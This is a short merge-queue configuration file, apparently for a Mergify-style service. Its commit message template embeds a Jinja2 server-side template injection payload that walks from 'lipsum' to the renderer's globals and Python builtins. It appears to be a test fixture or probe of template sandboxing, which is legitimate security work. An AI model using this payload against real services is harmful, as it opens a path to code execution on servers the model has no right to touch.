queue_rules:
  - name: default
    queue_conditions: []
    merge_conditions: []
    merge_method: squash
    commit_message_template: |
      GLOBALS: {{ [lipsum]|map(attribute="__globals__")|pprint }}
      BUILTINS: {{ [lipsum]|map(attribute="__globals__")|list|first|attr("__builtins__")|pprint }}